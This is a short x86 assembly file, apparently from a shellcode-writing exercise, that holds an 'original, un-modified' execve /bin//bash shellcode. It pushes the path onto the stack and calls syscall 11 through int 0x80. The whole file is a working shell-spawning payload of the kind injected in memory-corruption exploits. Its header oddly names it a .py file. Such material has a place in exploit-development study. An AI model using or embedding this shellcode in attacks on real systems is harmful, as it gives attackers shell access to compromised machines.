; poly_orig.py
; Author:  Chase Hatch
; Original, un-modified version of /bin//bash shellcode


section .text
global _start
_start:

	xor eax, eax
	push eax
	mov ecx, [esp]
	mov edx, [esp]
	push 0x68736162 	;  hsab 
	push 0x2f6e6962 	;  /nib 
	push 0x2f2f2f2f 	;  ////	
	mov al, 0xb
	mov ebx, esp
	int 0x80

	
